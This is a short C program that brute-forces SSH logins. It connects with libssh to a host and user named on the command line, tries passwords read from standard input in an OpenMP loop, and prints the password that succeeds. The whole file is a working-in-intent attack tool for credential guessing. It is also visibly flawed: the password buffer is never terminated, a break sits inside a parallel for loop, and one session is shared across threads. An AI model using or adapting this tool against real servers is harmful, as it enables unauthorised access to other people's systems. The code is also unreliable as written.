#include <libssh/libssh.h>
#include <ncurses.h>
#include <fcntl.h>
#include <stdlib.h>
#include <omp.h>

int main(int argc, char **argv)
{
	raw();
	noecho();
	//initscr();
	ssh_session SSH;
	int rc;
	int port = 22;
	char pass[128];
	
	ssh_init();
	SSH = ssh_new();
	
	ssh_options_set(SSH, SSH_OPTIONS_HOST, argv[1]);
	ssh_options_set(SSH, SSH_OPTIONS_USER, argv[2]);

	if( ssh_connect(SSH) != 0)
	{
		printf("%s\n", ssh_get_error(SSH));
		exit(-1);
	}
	
	char c;
	int scroll;
	
	#pragma omp parallel for firstprivate(SSH, pass, c, scroll)
	for(unsigned int X=0; X<0xffffffff; ++X)
	{
		scroll = 0;
		while(1)
		{
			read(0, &c, 1);
			if(c == '\n') break;
			pass[scroll] = c;
			++scroll;
		}	
		rc = ssh_userauth_password(SSH, NULL, pass);
		if(rc != SSH_AUTH_SUCCESS)
		{
			printf("%s:%s:%s\n", argv[1], argv[2], pass);
			refresh();
			continue;
		}
		else
		{
			endwin();
			printf("Password is %s\n", pass);
			ssh_disconnect(SSH);
			ssh_free(SSH);
			break;
		}
	}
}
